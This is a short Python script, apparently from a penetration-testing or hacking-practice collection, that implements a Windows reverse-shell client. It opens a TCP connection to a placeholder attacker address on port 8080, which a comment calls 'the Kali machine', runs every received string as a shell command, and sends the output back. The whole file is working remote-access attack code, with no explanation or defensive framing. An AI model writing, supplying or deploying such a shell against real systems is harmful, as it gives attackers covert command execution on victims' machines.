# TCP reverse shell windows client

import socket
import subprocess


def connect():
    sock = socket.socket()
    sock.connect(("xxx.xxx.xxx.xxx", 8080))  #

    while True:
        command = sock.recv(
            1024
        )  # keep receiving commands from the Kali machine, read the first KB of the tcp socket

        if "stop" in command.decode():
            sock.close()
            break
        else:
            cmd = subprocess.Popen(
                command.decode(),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            sock.send(cmd.stdout.read())  # send back result
            sock.send(cmd.stderr.read())


def main():
    connect()


if __name__ == "__main__":
    main()
